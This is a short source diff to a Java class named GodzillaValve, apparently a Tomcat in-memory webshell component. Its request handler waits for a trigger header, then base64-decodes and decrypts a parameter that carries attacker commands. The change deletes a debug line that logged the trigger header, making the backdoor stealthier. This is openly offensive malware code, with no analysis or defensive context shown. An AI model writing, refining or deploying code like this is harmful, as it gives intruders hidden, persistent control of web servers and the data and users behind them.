@@ -75,7 +75,6 @@ public class GodzillaValve extends ClassLoader implements Valve {
     public void invoke(Request request, Response response) throws IOException, ServletException {
         try {
             if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                System.out.println(headerName + ":" + headerValue);
                 HttpSession session = request.getSession();
                 byte[] data = base64Decode(request.getParameter(pass));
                 data = this.x(data, false);
